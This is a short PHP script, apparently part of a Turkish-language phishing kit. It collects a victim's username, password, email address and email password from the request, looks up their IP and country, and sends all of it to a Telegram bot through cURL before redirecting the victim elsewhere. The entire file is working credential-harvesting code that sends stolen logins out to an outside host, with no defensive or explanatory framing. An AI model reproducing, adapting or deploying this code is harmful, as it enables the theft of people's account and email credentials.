<?php
include './Config.php';

$redirectURL = Redirect_URL;
$TelegramAPI = Telegram_API;
$ip = $_SERVER['REMOTE_ADDR'];
$details = json_decode(file_get_contents("http://ip-api.com/json/{$ip}"));
$ulke = $details->country;
date_default_timezone_set('Europe/Istanbul');
$cur_time=date("d-m-Y H:i:s");
?>
<?php

$mail = $_GET["email"];
$mailpass = $_GET["passmail"];
$password =  $_GET['ndpass'];
$nick = $_GET['username'];
date_default_timezone_set('Europe/Istanbul');
$cur_time=date("d-m-Y H:i:s");

$mesaj ="Username: ".$nick."\nŞifre: ".$password."\nMail: ".$mail."\nMail Şifre: ".$mailpass."\nSaat:".$cur_time."\n-------------------------------------------\nDiğer Bilgiler:\nIP Adresi:".$ip."\nÜlke:".$ulke;

set_time_limit(0);
 {
 $ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $TelegramAPI);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "&text=$mesaj");
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_MAXREDIRS, 5);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_TIMEOUT, 20);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 25);
$go = curl_exec($ch);
$inf =  curl_getinfo($ch);
curl_close ($ch);
header("Location:".$redirectURL);
 }


?>

